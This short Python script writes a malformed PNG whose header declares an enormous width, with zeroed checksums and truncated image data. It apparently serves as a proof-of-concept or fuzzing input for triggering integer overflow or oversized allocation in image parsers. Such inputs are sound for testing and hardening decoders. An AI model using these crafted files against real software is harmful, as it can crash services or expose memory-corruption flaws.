import struct

def create_malformed_png(filename):
    def png_chunk(chunk_type, data):
        length = struct.pack(">I", len(data))
        crc = struct.pack(">I", 0)  # skipping CRC
        return length + chunk_type + data + crc

    png = b'\x89PNG\r\n\x1a\n'
    width = 0x7FFF0000
    height = 0x00001000
    ihdr_data = struct.pack(">IIBBBBB", width, height, 8, 6, 0, 0, 0)
    png += png_chunk(b'IHDR', ihdr_data)
    png += png_chunk(b'IDAT', b'\x00' * 10)
    png += png_chunk(b'IEND', b'')

    with open(filename, 'wb') as f:
        f.write(png)
        print(f"[+] Malformed PNG saved to {filename}")

create_malformed_png("malformed.png")